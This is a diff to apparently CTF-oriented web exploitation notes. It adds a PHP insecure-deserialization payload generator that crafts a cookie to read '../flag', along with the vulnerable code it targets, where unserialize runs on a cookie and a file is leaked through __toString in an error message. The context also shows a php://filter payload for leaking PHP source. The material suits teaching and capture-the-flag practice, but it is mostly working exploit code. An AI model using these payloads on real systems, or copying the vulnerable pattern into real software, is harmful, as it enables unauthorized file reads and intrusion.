@@ -28,6 +28,39 @@
 - when object is deserialized, you can basically create your own object with and set the values of the object properties
 - the functions defined in the original object is called and executed on your object with your specified values 
 
+### Example Payload Generator
+```php
+<?php
+class access_log
+{
+	public $log_file = "../flag";
+}
+print(urlencode(base64_encode(serialize(new access_log()))))
+?>
+```
+
+That was for this vulnerable code
+```php
+class access_log
+{
+	public $log_file;
+	function __toString() {
+		return $this->read_log();
+	}
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+try{
+  $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
+  $g = $perm->is_guest();
+  $a = $perm->is_admin();
+}
+  catch(Error $e){
+  die("Deserialization error. ".$perm);
+}
+```
+
 ## Leaking source code with file=something
 - `file=php://filter/convert.base64-encode/resource=filename.php`
 - note that sometimes `.php` maybe already appended and in that case remove `.php` from payload
